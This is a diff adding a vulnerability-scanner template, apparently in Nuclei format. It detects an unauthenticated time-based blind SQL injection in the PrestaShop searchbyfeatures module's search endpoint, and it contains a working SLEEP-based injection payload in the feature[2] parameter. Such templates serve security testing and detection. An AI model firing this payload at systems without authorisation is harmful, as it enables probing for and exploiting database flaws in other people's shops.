@@ -1,0 +1,46 @@
+id: searchbyfeatures-sqli
+
+info:
+  name: PrestaShop searchbyfeatures - Time-Based Blind SQL Injection
+  author: acunetix-export
+  severity: critical
+  description: |
+    Module searchbyfeatures for PrestaShop contains time-based blind SQL injection
+    in /module/searchbyfeatures/search via GET parameter feature[2]. No authentication required.
+  reference:
+    - https://security.friendsofpresta.org/
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 2
+    framework: prestashop
+    module: searchbyfeatures
+  tags: sqli,prestashop,searchbyfeatures,time-based,blind
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/module/searchbyfeatures/search"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403 && duration <= 3'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /module/searchbyfeatures/search?feature%5B2%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403'
